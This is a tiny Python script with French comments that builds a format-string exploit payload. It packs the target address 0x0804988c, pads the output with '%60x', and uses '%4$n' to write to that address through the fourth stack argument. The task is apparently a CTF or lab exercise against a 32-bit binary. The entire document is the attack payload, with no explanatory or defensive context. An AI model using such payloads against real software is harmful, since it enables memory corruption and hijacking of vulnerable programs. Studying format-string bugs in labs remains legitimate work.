import struct

addr = 0x0804988c
payload = struct.pack('<I', addr)  # 4 bytes
payload += "%60x"                  # 60 caractères
payload += "%4$n"                  # Écrire à arg 4

print (payload)
